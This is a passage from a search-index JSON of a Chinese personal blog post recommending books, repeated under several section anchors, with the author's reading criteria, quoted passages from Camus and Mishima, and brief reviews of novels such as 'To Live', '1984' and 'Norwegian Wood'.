《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#评价标准"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#推书文学性较强"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#推书人文社科类"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 海滩上也是火热的阳光。大海在急速而憋闷地喘息着，层层细浪拍击着沙岸。我漫步走向那片岩石，感到脑袋在太阳照射下膨胀起来了。周围的酷热都聚焦在我的身上，叫我举步维艰。每一阵热风扑面而来，我就要咬紧牙关，攥紧裤口袋里的拳头，全身绷紧，为的是能战胜太阳与它倾泻给我的那种昏昏然的迷幻感。从沙砾上、从白色贝壳上、从玻璃碎片上，投射出来的反光像一道道利剑，刺得我睁不开眼，不得不牙关紧缩。就这样我走了好久。《局外人》阿尔贝·加缪 短促明快并且清晰地展现了默尔索先生在“行凶”前后所感受到的“荒诞感”，陀思妥耶夫斯基也是这种文风，如果不是因为俄国人的名字太长太难记，这里引用的就是他的书。如果给我的喜好做几个特征抽象的话，就是： 视角相对集中，最好使用第一人称 环境描写主观性要强，要对当前描写的对象的精神产生显著影响，并引导其之后的行为 说人话，翻译作品不应有太明显的翻译痕迹 再摘一段我很喜欢的描写： “刚才，在那边，有为子给宪兵抓走了。我们一起去看看吧！” 我趿拉着木屐跑去。月夜清明，收割后的稻田里随处能看到稻架清晰的影子。 小树林的树荫里聚集着黑压压的一群人，不停地蠕动着。有为子穿着黑制服，坐在地面上，面色煞白。身边站着四五个宪兵和她的父母。一个宪兵拿出饭盒般的东西，对她吼叫着。她父亲向宪兵百般示好，反复求情，不住责骂女儿。母亲在一旁痛哭流涕。 我们站在田畦上，隔着一块稻田眺望。看热闹的人越来越多，彼此肩膀挨着肩膀，默默无语。月亮也仿佛被压挤得缩小了，挂在我们头顶上。 同学对着我的耳朵叙说着。 有为子是在带着饭盒走出家门、打算到邻村去的当儿，被埋伏的宪兵抓到的。那饭盒显然是送给逃兵的。逃兵和有为子在海军医院亲近，后来，怀孕的有为子被医院赶出来了。宪兵问她那个逃兵躲在哪里，有为子坐着一动不动，顽固地一声不吭。…… 我呢，眼睛一眨不眨凝视着有为子的脸，她像一个被抓到的女疯子，月光之下，面孔毫无表情。我以前从未见过死不认罪的面孔，我想到了自己遭到世界拒绝的面孔。然而，有为子的面孔却是拒绝世界的。月光一个劲儿流泻在她的额头、眼睛、鼻梁和面颊上，那副纹丝不动的容颜只是被月光洗涤着。她只要眼睛倏忽一亮，稍稍扭动一下嘴角，她所拒绝的世界似乎就会顺势从那里涌流进去。 《金阁寺》三岛由纪夫 大概就是这样，我这个人很容易被带节奏，只要感情上能打动我，就是好文风！ 下面开始讲书（排名不分先后，已过滤课内必读书目） 推书！（文学性较强） 《活着》 【中】余华 实在太刀了，富贵一家最后已经惨的丧失真实性了（太惨了反而丧失了感染力），但是确确实实能感受到祖辈们在历史的潮流下身不由己地那种无奈。 《1984》 【英】乔治·奥威尔 “栗树荫下，我出卖你，你出卖我。” 这个是初中时候看的，描述了一个极端集权的社会。“公知圣经”，虽然从社会学角度，奥威尔设想的制度毫无可行性，但是生活在任何国家任何社会制度下的人都能在这本书中找到本国政府的影子。 《动物庄园》 【英】乔治·奥威尔 “动物生而平等，但有的动物更平等一些。” 一个预言故事，非常讽刺，一场革命的变质。 《黄金时代》《黑铁时代》《王仙客寻无双记》等等 【中】王小波 这两本书是王小波小说中我认为最有韵味的。前者讲了那个逻辑混乱充满激情的十年岁月，后者具有象征性的情节细品很有味道（虽然现在也一知半解）。 我个人非常非常非常喜欢。 《三体系列》 【中】刘慈欣 格局实在太大，时间线纵贯古今，给人带来强烈的震撼并开始思考自我的时代定位。看出了史诗的感觉。 《看不见的城市》 【意大利】伊塔洛·卡尔维诺 几百字的迷你短篇拼成的一本合集，描述了一个个存在于概念中的城市，具象化了作者的哲学思考。 城市是个很有意思的尺度，不大不小，与日常生活息息相关但又很难整体把握。想象站在某个城市第一高楼向下俯瞰的情景，这本身就令人心旷神怡。 《倾城之恋》 【中】张爱玲 张爱玲一直是我心目中的女小说家top1，无论是文笔还是情节构思都是极高水平，背景多为民国上海和香港，前文中说的两点兼而有之，非常厉害。 《人生的智慧》 【德】叔本华 这是随笔，解决的是实用问题，就这一点就比那些全是概念的哲学书可读多了，（我虽然看完了，但现在还是啥也想不起来。 《金色梦乡》 【日】伊坂幸太郎 非常有电影感的描写，非常治愈的故事，但是文风还是太白开水了，可能因为这不是纯文学吧。 《小径分岔的花园》 【阿根廷】博尔赫斯 博尔赫斯也是作家中的作家，全球性的作家，没得诺奖是诺奖的遗憾，但是这书实在是太晦涩了，情节也让人一头雾水，适合拿来摘抄装深沉而不是看。高情商：文辞隽永，低情商：不说人话。 《罪与罚》 【俄】陀思妥耶夫斯基 在各个方面都达到了相当高的水平，“好书推荐”标准答案之一，无数后来者模仿他的文风，对犯罪者的描写入木三分让人怀疑陀氏是不是也杀过人（？） 《恶意》 【日】东野圭吾 畅销君的书这里只放一本，因为这本阅读体验最好（？），还是老问题，文风白开水，可能因为不是纯文学吧。 《罗生门》 【日】芥川龙之介 那个年代的日本作家的文字总是透露出一种“在癫狂的边缘”的气质，《罗生门》是一本小说集，水平参差不齐，但是忧郁中带点狂气的感觉我很喜欢。 《理想国》 【古希腊】柏拉图 初中看的，几个哲学比喻很经典也很有意思，这种语录体的讨论哲学的作品散发着一种理性美。 《挪威的森林》 【日】村上春树 村上文字有一种沉浸感，就是冥冥中有一种力量吸引着读者一直往下看，即使现在的情节让你感觉很无聊。《挪》展现了当时日本年轻人对自我社会定位与爱情的迷茫，随便找一段看都很抓人。其中大量的性描写对当时还是初中的我造成了极大的震撼。 《舞！舞！舞！》 【日】村上春树 高度发达的资本主义社会中个人寻找自我的一场冒险。 《金阁寺》 【日】三岛由纪夫 三岛美学代表，忧郁中带着狂气的经典气质，文笔极好，阅读体验很流畅。 《假面的告白》 【日】三岛由纪夫 带有自传性质的小说，对主角的心理描写极为深刻和露骨，比如种种有背德感的想法等等，比较阴暗。 《个人的体验》 【日】大江健三郎 妻子快生孩子了，主角仍在梦想着实现个人梦想：去非洲。详细描写了个人在梦想与社会期望脱节的情况下的心理活动。（浙江高考题警告） 《了不起的盖茨比》 【美】弗·司各特·菲茨杰拉德 又一本各种意义上的世界名著，但对我的触动不大，留给我印象最深的意象是黛西的那盏“绿灯”，我认为它象征着对一个虚幻的人的爱。盖茨比爱黛西，但这个黛西是他想象出来的，是一种象征。这个象征很复杂，需要结合各路书评理解。（但是我看的时候就是get不到点啊 《美丽新世界》 【英】阿道司·赫胥黎 和《1984》一样同为反乌托邦三部曲，如果说《1984》里描述的社会形式已经离我们远去，那《美丽新世界》所描述的未来则完全有可能实现，带给读者关于随着科技进步，社会形态变迁的思考。 《被讨厌的勇气》 【日】岸见一郎/古贺史健 精神鸦片，但架不住好用呀！！！ 最emo的时候同学推的，看完感觉好多了。 《潮骚》 【日】三岛由纪夫 文笔极好的爱情故事，结局竟然是好的，这年头好结局的爱情故事不多见呀。 《女生徒》 【日】太宰治 男作家带入女性视角写作的短篇小说集，心理活动很细腻。 《荒原狼》 【德】赫尔曼·黑塞 这本书我专门写过一篇文章去谈。 《围城》 【中】钱钟书 讽刺很漂亮，看着很乐。 《三重门》 【中】韩寒 对《围城》模仿痕迹极为明显，但更现代，看着更乐。 《红高粱家族》 【中】莫言 极为深重的历史苍桑感，乡土化的魔幻现实主义的写法。 《檀香刑》 【中】莫言 给莫言的文笔跪了，这书情节上没啥厉害的，描写太厉害了，我个人不太喜欢看大段描写，但是莫言这书里的描写太强了，看着超带感。 《正红旗下》 【中】老舍 老舍先生语言大师，人民艺术家，看他的文字是种享受。 《局外人》 【法】阿尔贝·加缪 “法庭判你死刑，哲学证你无罪。“ 文风和情节都让我很喜欢，整体传达出的这种荒诞感很契合现代人的心理。 《脑","date":"2022-01-18","objectID":"/articles/share-books/:0:0","series":null,"tags":null,"title":"分享一些看过的书","uri":"/articles/share-books/#推书散文杂文类"},{"categories":["文学"],"content":" 前言今天与人聊起看过的书，发现多年来虽然阅读量不少，却从没做过系统的整理，所以就有了这篇文章。初高中因为客观条件的限制，只能阅读纸质书，只记得总数很多，经过一个下午的回想，也没想起来多少，所以在这篇文章中出现的初高中读的作品都是印象很深刻的，很经典的作品，也算是变相筛掉了一些层次不高的消遣类读物吧。 评价标准我不止一次问自己，一本书打动我的究竟是什么，经过思考，我觉得可以大抵分为两类：“历史沧桑感”与“个人意识感染力”。在第一类书中，你能够感觉到作者表现出来的，某个时代，某个地区的人民的某种特殊的生存状态，能够感受到遥远的时空那端的人们与屏幕前的你的“精神共振”，看这种书的时候，你脑海里的想象画面是带着一层灰色滤镜的，因为作者时时刻刻都在传递着**“这不仅仅是小说，这反映的是那个时代的历史”**。在第二类书中，作者想要传递的是一种精神层面的震撼，一种个人意志的表达，这种小说的背景无关紧要，往往主角贯穿始终或者直接采用第一人称进行写作，甚至故事设置的时空背景与作者本人生活的时空背景相距甚远。但这不是重点，作者想要通过主角的经历，引发读者对某种精神困境的思考，越现代的小说往往越追求这种超时空的表达。任何一本书只要在以上两点中有任何一点打动我，在我这里它就是一本好书，这两点本身也没有高下之分。还有一类书无法归类到这两点中，这之后再说。 再来说说文风。文风上每个作家都各有特色，就我个人而言，我更偏好强剧情推动性的文字搭配简短的，想象空间高的环境描写。因为现代社会媒介已经很发达了，客观来讲，大段大段的环境描写已经对现代人失去了吸引力（尤其是翻译作品，连这种描写的韵味也在翻译的过程中丧失了）。我最喜欢什么样的文风呢，这里举个例子： 